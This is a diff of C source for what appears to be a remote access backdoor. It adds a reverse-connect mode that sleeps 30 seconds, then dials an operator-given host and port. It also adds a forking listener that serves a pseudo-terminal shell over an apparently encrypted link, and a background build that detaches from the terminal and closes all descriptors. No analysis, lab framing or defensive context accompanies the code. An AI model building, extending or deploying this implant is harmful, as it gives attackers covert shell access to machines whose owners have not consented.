@@ -1,9 +1,10 @@
 #include <pty.h>
+#include <sys/wait.h>
 #include "app.h"
 #include "connection.h"
 
 char message[BUFSIZE + 5];
-int msg_len;
+int msg_len;	
 
 bool init_server(){
 	byte IV[40];
@@ -104,7 +105,7 @@ bool run_shell(){
 				write(pty, message, msg_len);
 			}
 			if(FD_ISSET(pty, &rd)){
-				ret = read(pty, message, BUFSIZE);
+				ret = read(pty, message, BUFSIZE);	//message length should less than BUFSIZEp
 				//printf("%d\n", ret);
 				if(ret <= 0) break;
 				//if(ret < 0) return false;
@@ -115,8 +116,9 @@ bool run_shell(){
 		//printf("here\n");
 	}
 	else{
-		close( client );
-		close( pty );
+		close(client);
+		close(server);
+		close(pty);
 		if(setsid() < 0) return false;
 		if( ioctl( tty, TIOCSCTTY, NULL ) < 0) return false;
 		dup2( tty, 0 );
@@ -129,13 +131,46 @@ bool run_shell(){
 	return true;
 }
 
-void service(){
+bool service(){
+	struct sockaddr_in addr;
+	int addr_len;
 	char command_msg;
 	int cmd_msg_len, flag;
+	int pid;
 	while(1){
+#ifndef REVERSE
+		//whether the output shoule be added
+		if((client = accept(server, (struct sockaddr *)&addr, &addr_len)) < 0){
+			close(server);
+			return false;
+		}
+		pid = fork();
+		if(pid < 0){
+			close(client);
+			continue;
+		}
+		if(pid > 0){
+			waitpid(pid, NULL, 0);
+			close(client);
+			continue;
+		}
+#else
+		struct sockaddr_in addr;
+		sleep(30);
+		if((client = socket(AF_INET, SOCK_STREAM, 0)) < 0)
+			continue;
+		memset(&addr, 0, sizeof(addr));
+		addr.sin_family = AF_INET;
+		addr.sin_addr.s_addr = host;
+		addr.sin_port = htons(port);
+		if(connect(client, (struct sockaddr *)&addr, sizeof(addr)) < 0){
+			close( client );
+			continue;
+		}
+#endif
 		//printf("here\n");
-		if(init_server() == FAILURE) return;
-		if(recv_msg(&command_msg, &cmd_msg_len) == FAILURE) return;
+		if(init_server() == FAILURE) return false;
+		if(recv_msg(&command_msg, &cmd_msg_len) == FAILURE) return false;
 		//printf("here\n");
 		//printf("msg_len %d\n", msg_len);
 		//printf("%02x\n", command_msg);
@@ -145,10 +180,11 @@ void service(){
 			case RUN_SHELL:flag = run_shell();break;
 			default:;
 		}
-		if(flag == false) break;
-		reset_connection();
+		shutdown(client, 2);
+		//if(flag == false) break;
 		//printf("reset\n");
 	}
+	return true;
 }
 
 void usage(){
@@ -162,22 +198,15 @@ void usage(){
 
 int main(int argc, char *argv[]){
 	int ch, pid, i;
-	mode_of_sys = SERVER;
-#ifdef RELEASE
+#ifdef BACKGROUND
 	pid = fork();
 	if(pid < 0) return -1;
 	if(pid > 0) return 0;
 	if(setsid() < 0) return -1;
 	for(i = 0; i < 1024; ++i) close(i);
 #endif
-	while((ch = getopt(argc, argv, "frhi:p:")) != -1){
+	while((ch = getopt(argc, argv, "hi:p:")) != -1){
 		switch(ch){
-		    case 'f':
-				mode_of_work = FORWARDCON;
-				break;
-			case 'r':
-				mode_of_work = REVERSECON;
-				break;
 			case 'i':
 				host = inet_addr(optarg);
 				break;
@@ -191,12 +220,12 @@ int main(int argc, char *argv[]){
 				printf("Existence of unidentified parameters\n");
 		}
 	}
-	if(init_connection() == FAILURE){
-		printf("connect failure\n");
-	}
-	else{
-		service();
-		close_connection();
-	}
+#ifndef REVERSE
+	create_server_socket();
+#endif
+	service();
+#ifndef REVERSE
+	close(server);
+#endif
 	return 0;
 }
